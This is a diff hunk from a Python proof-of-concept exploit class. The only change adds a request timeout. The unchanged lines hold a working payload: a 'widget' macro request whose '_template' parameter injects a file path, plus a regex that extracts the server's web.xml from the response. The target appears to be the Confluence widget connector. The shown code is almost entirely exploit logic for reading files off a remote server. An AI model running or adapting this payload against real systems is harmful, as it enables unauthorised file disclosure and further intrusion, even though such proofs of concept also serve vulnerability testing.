@@ -33,7 +33,7 @@ class DemoPOC(POCBase):
             "Content-Type": "application/json; charset=utf-8"
         }
         data = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"%s"}}}' % filename
-        r = requests.post(paylaod, data=data, headers=headers)
+        r = requests.post(paylaod, data=data, headers=headers, timeout=15)
 
         if r.status_code == 200 and "</web-app>" in r.text:
             m = re.search('<web-app[\s\S]+<\/web-app>', r.text)
